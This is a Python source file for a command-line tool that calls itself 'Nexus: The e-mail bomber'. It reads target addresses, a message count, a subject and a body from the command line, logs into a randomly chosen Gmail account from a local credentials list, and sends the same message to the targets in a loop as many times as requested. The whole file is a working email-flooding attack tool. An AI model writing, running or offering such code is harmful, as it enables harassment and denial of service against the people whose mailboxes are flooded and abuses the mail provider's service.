# Built-in modules
import argparse
from email.mime.text import MIMEText
from smtplib import SMTP_SSL, SMTP_SSL_PORT
from sys import exit
from random import choice

# Third-party modules
from termcolor import colored as cl
from pyfiglet import figlet_format as ff

# Local modules
from email_accounts import ACCOUNTS
from error import fatal_error
from logo import print_logo
from other_utils import join_with_and


# parse the command-line arguments
parser = argparse.ArgumentParser(description="Nexus: The e-mail bomber.")

# target
parser.add_argument("target", nargs="*", help="The e-mail address(es) of the target(s).")
parser.add_argument("--target", "-t", nargs="*", default=None, help="The e-mail address(es) of the target(s).")

# num_emails
parser.add_argument("--num-emails", "-n", type=int, default=1, help="Number of e-mails to be sent.")

# subject
parser.add_argument("--subject", "-s", default="", help="The subject of the e-mail.")

# body
parser.add_argument("--body", "-b", default="", help="The body of the e-mail.")

args = parser.parse_args()

if not args.target: fatal_error("No target argument provided.")



print_logo()


# randomly choose an account
account = choice(ACCOUNTS)

# set up e-mail content
mime_content = MIMEText(args.body)
mime_content['Subject'] = args.subject
mime_content['From'] = account.address
mime_content['To'] = ', '.join(args.target)

# set up SMTP session
session = SMTP_SSL('smtp.gmail.com', SMTP_SSL_PORT)
session.login(account.address, account.password)

print(cl("SMTP connection successful ☑", "green"))
print(cl(f"Sending {args.num_emails} e-mails to {join_with_and(args.target)}", "green"))

# send the e-mails
for mail_no in range(args.num_emails):

    session.sendmail(account.address, args.target, mime_content.as_string())
    print(cl(f'Mail {mail_no + 1} sent successfully ☑', 'green'))
    
